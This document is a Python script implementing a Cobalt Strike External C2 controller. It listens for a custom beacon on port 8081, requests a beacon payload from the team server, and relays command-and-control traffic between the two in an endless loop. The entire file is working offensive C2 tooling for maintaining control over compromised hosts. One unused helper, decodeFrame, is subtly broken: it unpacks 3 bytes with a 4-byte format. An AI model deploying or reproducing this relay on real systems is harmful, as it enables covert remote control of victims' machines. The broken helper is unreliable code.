import socket
import struct
import time


class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encodeFrame(self, data):
        return struct.pack("<I", len(data)) + data

    def decodeFrame(self, data):
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len, body

    def sendToTS(self, data):
        self._socketTS.sendall(self.encodeFrame(data))

    def recvFromTS(self):
        data = bytearray()
        _len = self._socketTS.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, data):
        self._socketClient.sendall(self.encodeFrame(data))

    def recvFromBeacon(self):
        data = bytearray()
        _len = self._socketClient.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketClient.recv(l - len(data))
        return data

    def run(self):
        # First thing, wait for a connection from our custom beacon
        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketBeacon.bind(("0.0.0.0", 8081))
        self._socketBeacon.listen(1)
        self._socketClient = self._socketBeacon.accept()[0]
        print("Received C2 connection")

        # Now we have a beacon connection, we kick off comms with CS External C2
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketTS.connect(("127.0.0.1", self.port))

        # Send out config options
        self.sendToTS("arch=x86".encode())
        self.sendToTS("pipename=xpntest".encode())
        self.sendToTS("block=500".encode())
        self.sendToTS("go".encode())

        # Receive the beacon payload from CS to forward to our custom beacon
        data = self.recvFromTS()

        while True:
            print("Sending %d bytes to beacon" % len(data))
            self.sendToBeacon(data)

            data = self.recvFromBeacon()
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.sendToTS(data)

            data = self.recvFromTS()
            print("Received %d bytes from TS" % len(data))


controller = ExternalC2Controller(2222)
controller.run()

